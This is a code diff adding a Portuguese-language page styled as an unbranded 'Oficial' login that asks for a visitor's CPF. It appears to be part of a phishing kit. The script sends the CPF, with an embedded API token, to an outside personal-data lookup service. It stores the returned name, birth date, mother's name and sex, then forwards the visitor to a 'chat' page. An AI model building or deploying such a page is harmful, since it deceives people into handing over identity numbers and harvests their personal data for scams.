@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <title>Oficial | Login</title>
+        
+        <style>
+          * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+          }
+    
+          body {
+            font-family:
+              -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica",
+              "Arial", sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+          }
+    
+          .container {
+            margin-top: -20%;
+            width: 100%;
+            max-width: 420px;
+            padding: 20px 20px 60px;
+            animation: fadeIn 0.6s ease-out;
+          }
+    
+          @keyframes fadeIn {
+            from {
+              opacity: 0;
+              transform: translateY(20px);
+            }
+            to {
+              opacity: 1;
+              transform: translateY(0);
+            }
+          }
+    
+          .title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #0f172a;
+            margin-bottom: 24px;
+          }
+    
+          .input-group {
+            margin-bottom: 20px;
+          }
+    
+          .input-wrapper {
+            position: relative;
+            margin-bottom: 30px;
+          }
+    
+          .cpf-input {
+            width: 100%;
+            height: 54px;
+            padding: 0 14px;
+            font-size: 16px;
+            border: 1px solid #e6e9ef;
+            border-radius: 12px;
+            outline: none;
+            transition: all 0.2s ease;
+            font-family:
+              -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Helvetica",
+              "Arial", sans-serif;
+            background: transparent;
+            color: #0f172a;
+          }
+    
+          .cpf-input:focus {
+            border-color: #cbd5e1;
+            box-shadow: 0 0 0 3px rgba(230, 0, 126, 0.08);
+          }
+    
+          .cpf-input::placeholder {
+            color: #94a3b8;
+          }
+    
+          .cpf-input.invalid {
+            border-color: #f44336;
+            animation: shake 0.4s ease;
+          }
+    
+          @keyframes shake {
+            0%,
+            100% {
+              transform: translateX(0);
+            }
+            25% {
+              transform: translateX(-10px);
+            }
+            75% {
+              transform: translateX(10px);
+            }
+          }
+    
+          .error-message {
+            color: #f44336;
+            font-size: 14px;
+            margin-top: 8px;
+            display: none;
+            animation: slideDown 0.3s ease;
+          }
+    
+          .error-message.show {
+            display: block;
+          }
+    
+          @keyframes slideDown {
+            from {
+              opacity: 0;
+              transform: translateY(-5px);
+            }
+            to {
+              opacity: 1;
+              transform: translateY(0);
+            }
+          }
+    
+          .toggle-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            cursor: pointer;
+            user-select: none;
+          }
+    
+          .toggle {
+            position: relative;
+            width: 46px;
+            height: 26px;
+            background: #e0e0e0;
+            border-radius: 50px;
+            transition: background 0.3s ease;
+            flex-shrink: 0;
+          }
+    
+          .toggle.active {
+            background: #e6007e;
+          }
+    
+          .toggle-circle {
+            position: absolute;
+            top: 3px;
+            left: 3px;
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            transition: left 0.3s ease;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.15);
+          }
+    
+          .toggle.active .toggle-circle {
+            left: 23px;
+          }
+    
+          .toggle-label {
+            font-size: 15px;
+            color: #0f172a;
+          }
+    
+          .continue-button {
+            width: 100%;
+            height: auto;
+            background: linear-gradient(to right, #ff3e9e, #e6007e);
+            color: white;
+            border: none;
+            border-radius: 14px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: none;
+            margin-bottom: 30px;
+          }
+    
+          .continue-button:hover {
+            opacity: 0.9;
+          }
+    
+          .continue-button:active {
+            transform: translateY(1px);
+          }
+    
+          .continue-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            opacity: 0.5;
+          }
+    
+          .footer-links {
+            text-align: center;
+            font-size: 14px;
+            color: #0f172a;
+            margin-bottom: 14px;
+          }
+    
+          .footer-links a {
+            color: #e6007e;
+            text-decoration: none;
+            font-weight: 700;
+          }
+    
+          .footer-links a:hover {
+            text-decoration: none;
+          }
+    
+          .terms {
+            margin-top: 14px;
+            font-size: 13px;
+            color: #525866;
+            text-align: center;
+          }
+    
+          .terms a {
+            color: #525866;
+            text-decoration: none;
+          }
+    
+          .terms a:hover {
+            text-decoration: underline;
+          }
+    
+          @media (max-width: 600px) {
+            .container {
+              padding: 20px 20px 40px;
+            }
+    
+            .title {
+              font-size: 20px;
+            }
+    
+            .cpf-input {
+              font-size: 16px;
+            }
+    
+            .continue-button {
+              font-size: 16px;
+            }
+          }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <h1 class="title">Digite seu CPF</h1>
+    
+          <div class="input-group">
+            <div class="input-wrapper">
+              <input type="tel" class="cpf-input" id="cpfInput" placeholder="000.000.000-00" maxlength="14" inputmode="numeric" autocomplete="off">
+              <div class="error-message" id="errorMessage">CPF inválido</div>
+            </div>
+          </div>
+    
+          <div class="toggle-wrapper" id="toggleWrapper">
+            <div class="toggle" id="toggle">
+              <div class="toggle-circle"></div>
+            </div>
+            <span class="toggle-label">Lembrar CPF para o próximo acesso</span>
+          </div>
+    
+          <button class="continue-button" id="continueButton">Continuar</button>
+    
+          <div class="footer-links">
+            <a href="index.html#">Veja aqui</a> soluções para a sua empresa.
+          </div>
+    
+          <div class="terms">
+            <a href="index.html#">Termos de Uso</a> e <a href="index.html#">Política de Privacidade</a>
+          </div>
+        </div>
+    
+        <script>
+          const cpfInput = document.getElementById("cpfInput");
+          const errorMessage = document.getElementById("errorMessage");
+          const continueButton = document.getElementById("continueButton");
+          const toggle = document.getElementById("toggle");
+          const toggleWrapper = document.getElementById("toggleWrapper");
+          let rememberCPF = false;
+    
+          cpfInput.addEventListener("input", function (e) {
+            let value = e.target.value.replace(/\D/g, "");
+    
+            if (value.length <= 11) {
+              value = value.replace(/(\d{3})(\d)/, "$1.$2");
+              value = value.replace(/(\d{3})(\d)/, "$1.$2");
+              value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+            }
+    
+            e.target.value = value;
+    
+            if (errorMessage.classList.contains("show")) {
+              errorMessage.classList.remove("show");
+              cpfInput.classList.remove("invalid");
+            }
+          });
+    
+          toggleWrapper.addEventListener("click", function () {
+            rememberCPF = !rememberCPF;
+            toggle.classList.toggle("active");
+          });
+    
+          function validarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, "");
+    
+            if (cpf.length !== 11) return false;
+    
+            if (/^(\d)\1{10}$/.test(cpf)) return false;
+    
+            let soma = 0;
+            for (let i = 0; i < 9; i++) {
+              soma += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.charAt(9))) return false;
+    
+            soma = 0;
+            for (let i = 0; i < 10; i++) {
+              soma += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            resto = (soma * 10) % 11;
+            if (resto === 10 || resto === 11) resto = 0;
+            if (resto !== parseInt(cpf.charAt(10))) return false;
+    
+            return true;
+          }
+    
+          continueButton.addEventListener("click", function () {
+            const cpf = cpfInput.value;
+    
+            if (validarCPF(cpf)) {
+              if (rememberCPF) {
+                localStorage.setItem("cpf", cpf);
+              }
+    
+              continueButton.disabled = true;
+              continueButton.textContent = "Carregando...";
+    
+           const cpfLimpo = cpf.replace(/\D/g, "");
+
+// Chama a API da Amnésia diretamente (sem CORS proxy)
+const _cpfToken = '76418167-38e2-46aa-acf1-51ed15b4db9f';
+const _cpfBase = 'https://api.amnesiatecnologia.lat';
+
+fetch(`${_cpfBase}/?token=${_cpfToken}&cpf=${encodeURIComponent(cpfLimpo)}`, {
+  method: "GET",
+  headers: {
+    Accept: "application/json"
+  }
+})
+  .then((response) => {
+    if (!response.ok) throw new Error("CPF não encontrado");
+    return response.json();
+  })
+  .then((data) => {
+    const d = data.DADOS || {};
+    const nome = d.nome || "";
+
+    if (nome) {
+      localStorage.setItem("userName", nome);
+      localStorage.setItem("userCPF", d.cpf || cpfLimpo);
+      localStorage.setItem("userBirth", d.data_nascimento || "");
+      localStorage.setItem("userMother", d.nome_mae || "");
+      localStorage.setItem("userSex", d.sexo || "");
+      localStorage.setItem("apiResponse", JSON.stringify(data));
+
+      const currentUrlParams = window.location.search;
+      window.location.href = "../chat/" + currentUrlParams;
+    } else {
+      continueButton.disabled = false;
+      continueButton.textContent = "Continuar";
+      cpfInput.classList.add("invalid");
+      errorMessage.textContent = "CPF não encontrado";
+      errorMessage.classList.add("show");
+
+      setTimeout(() => {
+        cpfInput.classList.remove("invalid");
+      }, 400);
+    }
+  })
+  .catch((error) => {
+    console.error("Erro ao consultar CPF:", error);
+
+    continueButton.disabled = false;
+    continueButton.textContent = "Continuar";
+    cpfInput.classList.add("invalid");
+    errorMessage.textContent = "Erro ao consultar CPF";
+    errorMessage.classList.add("show");
+
+    setTimeout(() => {
+      cpfInput.classList.remove("invalid");
+    }, 400);
+  });
+            } else {
+              cpfInput.classList.add("invalid");
+              errorMessage.textContent = "CPF inválido";
+              errorMessage.classList.add("show");
+    
+              setTimeout(() => {
+                cpfInput.classList.remove("invalid");
+              }, 400);
+            }
+          });
+    
+          cpfInput.addEventListener("keypress", function (e) {
+            if (e.key === "Enter") {
+              continueButton.click();
+            }
+          });
+    
+          window.addEventListener("load", function () {
+            const savedCPF = localStorage.getItem("cpf");
+            if (savedCPF) {
+              cpfInput.value = savedCPF;
+              rememberCPF = true;
+              toggle.classList.add("active");
+            }
+          });
+        </script>
+    
+    </body></html>
